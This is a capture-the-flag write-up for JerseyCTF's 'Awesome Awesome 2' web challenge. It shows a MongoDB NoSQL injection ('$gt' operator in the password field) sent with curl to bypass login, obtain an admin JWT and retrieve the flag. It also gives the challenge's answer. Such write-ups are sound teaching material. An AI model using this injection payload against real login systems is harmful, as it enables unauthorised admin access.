# CTF Writeup — Awesome Awesome 2

**Event:** JerseyCTF  
**Category:** Web  
**Difficulty:** Medium  
**Flag:** `jctf{MANG0S}`

---

## Challenge Description

> Awesome Awesome needs your help... he is in space this time! Awesome Awesome wants your help breaking into awful awful's space station as an admin account. And remember, its all about the friends we make along the way.
>
> **Hint:** Awesome Awesome heard Awful Awful loves to use MongoDB.

---

## Reconnaissance

### Step 1 — Enumerate the Application

The root page (`/`) redirects unauthenticated users to `login.html` via a client-side fetch to `/api/me`. The flag is delivered through this same endpoint — but only if the session belongs to an admin:

```javascript
fetch('/api/me')
  .then(res => { ... })
  .then(data => {
    document.getElementById('username').textContent = data.username;
    if (data.flag) document.getElementById('flag').textContent = 'Flag: ' + data.flag;
  });
```

### Step 2 — Identify the Login Endpoint

Inspecting `login.html` source reveals the login form POSTs JSON to `/api/login`:

```bash
curl -si http://awesome-awesome-2.aws.jerseyctf.com/login.html | grep -i 'fetch\|api'
# → fetch('/api/login', { method: 'POST', ... })
```

### Step 3 — Note the MongoDB Hint

The challenge hint explicitly states the backend uses **MongoDB**. Combined with a JSON-accepting login endpoint, this is a strong signal for **NoSQL Injection** using MongoDB query operators.

---

## Exploitation

### Step 4 — NoSQL Injection on Login

MongoDB query operators like `$gt` (greater than) can be injected into JSON login bodies. The payload:

```json
{
  "username": "admin",
  "password": { "$gt": "" }
}
```

This tells MongoDB to find a user where `username = "admin"` AND `password > ""` — which is true for any non-empty password string, effectively bypassing authentication entirely.

```bash
curl -si http://awesome-awesome-2.aws.jerseyctf.com/api/login \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$gt":""}}'
```

Response:
```json
HTTP/1.1 200 OK
{
  "ok": true,
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzc2NTQwOTcyLCJleHAiOjE3NzY2MjczNzJ9.OOBDwW94y9cx9ZiDJ_XzQh6YgflpG6o2Bl1yjBd_5fE"
}
```

A valid JWT for `username: "admin"` is returned.

### Step 5 — Retrieve the Flag via `/api/me`

The token is sent as a Bearer token in the `Authorization` header:

```bash
curl -si http://awesome-awesome-2.aws.jerseyctf.com/api/me \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

Response:
```json
HTTP/1.1 200 OK
{
  "username": "admin",
  "flag": "jctf{MANG0S}"
}
```

---

## Flag

```
jctf{MANG0S}
```

*(A play on "MongoDB" → "Mongo" → "Mango" 🥭)*


---

## Attack Flow

```
Enumerate / → redirects to login.html
        │
        ▼
Inspect login.html → POST /api/login (JSON body)
        │
        ▼
Hint: MongoDB backend → try NoSQL operator injection
        │
        ▼
POST /api/login
  { "username": "admin", "password": { "$gt": "" } }
        │
        ▼
MongoDB query matches admin user (password > "" = true)
        │
        ▼
Server returns JWT for admin session
        │
        ▼
GET /api/me -H "Authorization: Bearer <token>"
        │
        ▼
{ "username": "admin", "flag": "jctf{MANG0S}" }
```
